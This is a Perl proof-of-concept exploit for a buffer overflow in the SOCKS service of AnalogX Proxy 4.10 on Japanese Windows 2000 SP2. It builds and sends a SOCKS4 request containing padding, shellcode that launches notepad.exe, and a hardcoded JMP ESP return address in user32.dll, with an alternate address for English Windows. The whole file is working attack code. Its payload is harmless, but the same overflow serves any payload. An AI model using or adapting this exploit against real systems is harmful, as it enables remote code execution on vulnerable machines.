#!/usr/local/bin/perl

#-----------------------------------------------------------
# AnalogX Proxy Version 4.10 exploit for Japanese Windows 2000 Pro (SP2)
# written by Kanatoko <anvil@jumperz.net>
# http://www.jumperz.net/
# thanx to: hsj (http://hsj.shadowpenguin.org/)
#-----------------------------------------------------------
use Socket;

$connect_host = "socks.example.com";
$port = 1080;
$iaddr = inet_aton($connect_host) || die "Host Resolve Error.\n";
$sock_addr = pack_sockaddr_in($port,$iaddr);
socket(SOCKET,PF_INET,SOCK_STREAM,0) || die "Socket Error.\n";
connect(SOCKET,$sock_addr) || die "Connect Error\n";
select(SOCKET); $|=1; select(STDOUT);

        # egg written by UNYUN (http://www.shadowpenguin.org/)
        # 57bytes
$egg  = "\xEB\x27\x8B\x34\x24\x33\xC9\x33\xD2\xB2";
$egg .= "\x0B\x03\xF2\x88\x0E\x2B\xF2\xB8\xAF\xA7";
$egg .= "\xE6\x77\xB1\x05\xB2\x04\x2B\xE2\x89\x0C";
$egg .= "\x24\x2B\xE2\x89\x34\x24\xFF\xD0\x90\xEB";
$egg .= "\xFD\xE8\xD4\xFF\xFF\xFF";
$egg .= "notepad.exe";

$buf  = "\x04\x01\x00\x19\x00\x00\x00\x01";
$buf .= "A" x 32;
$buf .= $egg;
$buf .= "\x00";
$buf .= "A" x 144;

        # JMP ESP in user32.dll( Japanese Windows 2000 Pro SP2 ) : 0x77DF492B
        # If you use English Windows 2000, try 0x77E2492B
$buf .= "\x2B\x49\xdf\x77";

        # JMP +0x22
$buf .= "\xEB\x22";
$buf .= "\x00";

print SOCKET $buf;
